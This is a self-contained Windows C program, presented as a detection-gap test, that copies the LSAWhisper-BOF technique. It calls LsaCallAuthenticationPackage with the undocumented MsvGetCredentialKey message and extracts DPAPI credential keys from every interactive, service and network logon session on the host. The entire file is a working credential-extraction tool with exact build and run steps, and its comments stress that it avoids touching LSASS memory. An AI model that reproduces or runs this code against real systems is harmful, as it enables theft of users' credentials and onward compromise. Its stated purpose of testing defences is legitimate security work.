/*
 * lsa_gap_test.c
 * Fully self-contained — works with plain MinGW gcc on Windows.
 *
 * BUILD (copy this exactly):
 *   gcc .\lsa_gap_test.c -o test.exe -lsecur32
 *
 * RUN (elevated CMD or PowerShell as Administrator):
 *   .\test.exe
 */

#ifndef UNICODE
#define UNICODE
#endif
#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0601
#endif

#include <windows.h>
#include <stdio.h>

/* -----------------------------------------------------------------------
 * All NT/LSA definitions inline — no ntstatus.h or ntsecapi.h needed.
 * Works on plain MinGW without extra SDK headers.
 * ----------------------------------------------------------------------- */

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((LONG)0x00000000L)
#endif

typedef LONG NTSTATUS;

typedef struct _LSA_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PCHAR  Buffer;
} LSA_STRING, *PLSA_STRING;

typedef UNICODE_STRING LSA_UNICODE_STRING;
typedef LSA_UNICODE_STRING *PLSA_UNICODE_STRING;

typedef ULONG SECURITY_LOGON_TYPE;
#define Interactive  (SECURITY_LOGON_TYPE)2
#define Network      (SECURITY_LOGON_TYPE)3
#define Service      (SECURITY_LOGON_TYPE)5

typedef struct _SECURITY_LOGON_SESSION_DATA {
    ULONG               Size;
    LUID                LogonId;
    LSA_UNICODE_STRING  UserName;
    LSA_UNICODE_STRING  LogonDomain;
    LSA_UNICODE_STRING  AuthenticationPackage;
    SECURITY_LOGON_TYPE LogonType;
    ULONG               Session;
    PSID                Sid;
    LARGE_INTEGER       LogonTime;
    LSA_UNICODE_STRING  LogonServer;
    LSA_UNICODE_STRING  DnsDomainName;
    LSA_UNICODE_STRING  Upn;
} SECURITY_LOGON_SESSION_DATA, *PSECURITY_LOGON_SESSION_DATA;

/* MsvGetCredentialKey = 0x37 (55 decimal)
 * Undocumented MSV1_0 message — documented by Evan McBroom, SpecterOps.
 * This is the exact message LSAWhisper-BOF sends. */
typedef ULONG MSV1_0_PROTOCOL_MESSAGE_TYPE;
#define MsvGetCredentialKey ((MSV1_0_PROTOCOL_MESSAGE_TYPE)0x37)

typedef struct _MSV1_0_CREDENTIAL_KEY_REQUEST {
    MSV1_0_PROTOCOL_MESSAGE_TYPE MessageType;
    LUID                         LogonId;
} MSV1_0_CREDENTIAL_KEY_REQUEST;

typedef struct _MSV1_0_CREDENTIAL_KEY_RESPONSE {
    MSV1_0_PROTOCOL_MESSAGE_TYPE MessageType;
    ULONG                        CredentialKeyType;
    UCHAR                        CredentialKey[20];
} MSV1_0_CREDENTIAL_KEY_RESPONSE;

/* LSA function pointer types */
typedef NTSTATUS (WINAPI *pfnLsaRegisterLogonProcess)(PLSA_STRING, PHANDLE, PULONG);
typedef NTSTATUS (WINAPI *pfnLsaLookupAuthenticationPackage)(HANDLE, PLSA_STRING, PULONG);
typedef NTSTATUS (WINAPI *pfnLsaCallAuthenticationPackage)(HANDLE, ULONG, PVOID, ULONG, PVOID*, PULONG, PNTSTATUS);
typedef NTSTATUS (WINAPI *pfnLsaFreeReturnBuffer)(PVOID);
typedef NTSTATUS (WINAPI *pfnLsaEnumerateLogonSessions)(PULONG, PLUID*);
typedef NTSTATUS (WINAPI *pfnLsaGetLogonSessionData)(PLUID, PSECURITY_LOGON_SESSION_DATA*);
typedef NTSTATUS (WINAPI *pfnLsaDeregisterLogonProcess)(HANDLE);

/* Global function pointers */
static pfnLsaRegisterLogonProcess        _LsaRegisterLogonProcess        = NULL;
static pfnLsaLookupAuthenticationPackage _LsaLookupAuthenticationPackage = NULL;
static pfnLsaCallAuthenticationPackage   _LsaCallAuthenticationPackage   = NULL;
static pfnLsaFreeReturnBuffer            _LsaFreeReturnBuffer            = NULL;
static pfnLsaEnumerateLogonSessions      _LsaEnumerateLogonSessions      = NULL;
static pfnLsaGetLogonSessionData         _LsaGetLogonSessionData         = NULL;
static pfnLsaDeregisterLogonProcess      _LsaDeregisterLogonProcess      = NULL;

/* -----------------------------------------------------------------------
 * Load all LSA functions dynamically — no import lib needed at link time
 * ----------------------------------------------------------------------- */
static int LoadLsaFunctions(void) {
    HMODULE h = LoadLibraryA("secur32.dll");
    if (!h) { printf("[-] LoadLibrary secur32.dll failed: %lu\n", GetLastError()); return 0; }

    _LsaRegisterLogonProcess        = (pfnLsaRegisterLogonProcess)       GetProcAddress(h, "LsaRegisterLogonProcess");
    _LsaLookupAuthenticationPackage = (pfnLsaLookupAuthenticationPackage)GetProcAddress(h, "LsaLookupAuthenticationPackage");
    _LsaCallAuthenticationPackage   = (pfnLsaCallAuthenticationPackage)  GetProcAddress(h, "LsaCallAuthenticationPackage");
    _LsaFreeReturnBuffer            = (pfnLsaFreeReturnBuffer)           GetProcAddress(h, "LsaFreeReturnBuffer");
    _LsaEnumerateLogonSessions      = (pfnLsaEnumerateLogonSessions)     GetProcAddress(h, "LsaEnumerateLogonSessions");
    _LsaGetLogonSessionData         = (pfnLsaGetLogonSessionData)        GetProcAddress(h, "LsaGetLogonSessionData");
    _LsaDeregisterLogonProcess      = (pfnLsaDeregisterLogonProcess)     GetProcAddress(h, "LsaDeregisterLogonProcess");

    if (!_LsaRegisterLogonProcess || !_LsaLookupAuthenticationPackage ||
        !_LsaCallAuthenticationPackage || !_LsaFreeReturnBuffer ||
        !_LsaEnumerateLogonSessions || !_LsaGetLogonSessionData ||
        !_LsaDeregisterLogonProcess) {
        printf("[-] Failed to resolve LSA functions\n"); return 0;
    }
    printf("    [+] secur32.dll loaded OK\n");
    return 1;
}

static void InitLsaString(PLSA_STRING s, PCHAR buf) {
    s->Buffer        = buf;
    s->Length        = (USHORT)strlen(buf);
    s->MaximumLength = (USHORT)(s->Length + 1);
}

static void PrintHex(const char *label, UCHAR *data, ULONG len) {
    printf("    [+] %s: ", label);
    for (ULONG i = 0; i < len; i++) printf("%02X", data[i]);
    printf("\n");
}

/* -----------------------------------------------------------------------
 * Core test — the three calls that mirror LSAWhisper-BOF exactly
 * ----------------------------------------------------------------------- */
static int RunLsaTest(LUID targetLuid) {
    HANDLE   lsaHandle = NULL;
    ULONG    authPkg   = 0;
    NTSTATUS status    = 0;
    NTSTATUS subStatus = 0;
    LSA_STRING procName, pkgName;

    /* STEP 1: LsaRegisterLogonProcess
     * Registers this process as an LSA trusted client.
     * Fires Windows Security Event ID 4611 if audit policy is on.
     * Requires SeTcbPrivilege — need to run as Administrator/SYSTEM. */
    InitLsaString(&procName, "svcgaptest");
    printf("[*] STEP 1: LsaRegisterLogonProcess...\n");
    status = _LsaRegisterLogonProcess(&procName, &lsaHandle, NULL);
    if (status != STATUS_SUCCESS) {
        printf("[-] FAILED: 0x%08X  (need Administrator / SYSTEM)\n", (unsigned)status);
        return 1;
    }
    printf("    [+] SUCCESS  Handle: %p\n", lsaHandle);

    /* STEP 2: LsaLookupAuthenticationPackage
     * Resolves numeric ID of MSV1_0 — the NTLM/local auth package that
     * holds DPAPI credential keys. */
    InitLsaString(&pkgName, "MICROSOFT_AUTHENTICATION_PACKAGE_V1_0");
    printf("[*] STEP 2: LsaLookupAuthenticationPackage...\n");
    status = _LsaLookupAuthenticationPackage(lsaHandle, &pkgName, &authPkg);
    if (status != STATUS_SUCCESS) {
        printf("[-] FAILED: 0x%08X\n", (unsigned)status);
        _LsaDeregisterLogonProcess(lsaHandle);
        return 1;
    }
    printf("    [+] SUCCESS  Package ID: %lu\n", authPkg);

    /* STEP 3: LsaCallAuthenticationPackage (MsvGetCredentialKey = 0x37)
     * THE MONEY CALL. Identical to what LSAWhisper-BOF sends.
     * No handle to lsass.exe. No memory read. PPL irrelevant.
     * Goes through LSA trusted client named pipe to msv1_0.dll. */
    MSV1_0_CREDENTIAL_KEY_REQUEST  req;
    MSV1_0_CREDENTIAL_KEY_RESPONSE *pResp = NULL;
    ULONG respLen = 0;

    memset(&req, 0, sizeof(req));
    req.MessageType = MsvGetCredentialKey;
    req.LogonId     = targetLuid;

    printf("[*] STEP 3: LsaCallAuthenticationPackage (MsvGetCredentialKey=0x37)...\n");
    printf("    [*] LUID: 0x%08X:0x%08X\n",
           (unsigned)targetLuid.HighPart, (unsigned)targetLuid.LowPart);

    status = _LsaCallAuthenticationPackage(
        lsaHandle, authPkg,
        &req, sizeof(req),
        (PVOID*)&pResp, &respLen, &subStatus);

    if (status != STATUS_SUCCESS) {
        printf("[-] Outer FAILED: 0x%08X\n", (unsigned)status);
    } else if (subStatus != STATUS_SUCCESS) {
        printf("[-] Inner FAILED: 0x%08X  (invalid LUID or session ended)\n", (unsigned)subStatus);
    } else {
        printf("    [+] SUCCESS  %lu bytes returned\n", respLen);
        if (pResp && respLen >= sizeof(MSV1_0_CREDENTIAL_KEY_RESPONSE)) {
            printf("\n");
            printf("    ============================================================\n");
            printf("    CREDENTIAL KEY EXTRACTED — technique works on this host\n");
            printf("    ============================================================\n");
            PrintHex("CredKey", pResp->CredentialKey, 20);
            printf("    KeyType: %lu  (1=Local SHA OWF  2=Domain NT OWF)\n", pResp->CredentialKeyType);
            printf("    ============================================================\n\n");
        }
        if (pResp) _LsaFreeReturnBuffer(pResp);
    }

    _LsaDeregisterLogonProcess(lsaHandle);
    return (status == STATUS_SUCCESS && subStatus == STATUS_SUCCESS) ? 0 : 2;
}

/* -----------------------------------------------------------------------
 * Enumerate sessions and test each interactive/service/network one
 * ----------------------------------------------------------------------- */
static void EnumerateAndTest(void) {
    ULONG    count    = 0;
    PLUID    sessions = NULL;
    NTSTATUS status;

    printf("[*] Enumerating logon sessions...\n\n");
    status = _LsaEnumerateLogonSessions(&count, &sessions);
    if (status != STATUS_SUCCESS) {
        printf("[-] LsaEnumerateLogonSessions failed: 0x%08X\n", (unsigned)status);
        return;
    }
    printf("[*] Found %lu sessions\n\n", count);

    for (ULONG i = 0; i < count; i++) {
        PSECURITY_LOGON_SESSION_DATA pData = NULL;
        if (_LsaGetLogonSessionData(&sessions[i], &pData) == STATUS_SUCCESS && pData) {
            if (pData->LogonType == Interactive ||
                pData->LogonType == Service     ||
                pData->LogonType == Network) {
                printf("----------------------------------------------------------\n");
                printf("[*] Session %lu/%lu  LUID: 0x%08X:0x%08X  Type: %lu\n",
                       i+1, count,
                       (unsigned)sessions[i].HighPart,
                       (unsigned)sessions[i].LowPart,
                       pData->LogonType);
                if (pData->UserName.Buffer)
                    printf("    User: %S\\%S\n",
                           pData->LogonDomain.Buffer, pData->UserName.Buffer);
                RunLsaTest(sessions[i]);
                printf("\n");
            }
            _LsaFreeReturnBuffer(pData);
        }
    }
    _LsaFreeReturnBuffer(sessions);
}

/* -----------------------------------------------------------------------
 * main
 * ----------------------------------------------------------------------- */
int main(int argc, char *argv[]) {
    printf("=================================================================\n");
    printf("  LSA Gap Test — CrowdStrike Detection Surface Probe\n");
    printf("  Mirrors LSAWhisper-BOF API surface exactly\n");
    printf("  No LSASS handle. No memory read. No DLL. No registry write.\n");
    printf("=================================================================\n\n");

    printf("[*] Loading LSA functions...\n");
    if (!LoadLsaFunctions()) return 1;
    printf("\n");

    if (argc == 2) {
        LUID luid = {0};
        unsigned long long raw = strtoull(argv[1], NULL, 0);
        luid.LowPart  = (ULONG)(raw & 0xFFFFFFFF);
        luid.HighPart = (LONG)((raw >> 32) & 0xFFFFFFFF);
        printf("[*] Testing LUID: %s\n\n", argv[1]);
        return RunLsaTest(luid);
    } else {
        EnumerateAndTest();
    }
    return 0;
}
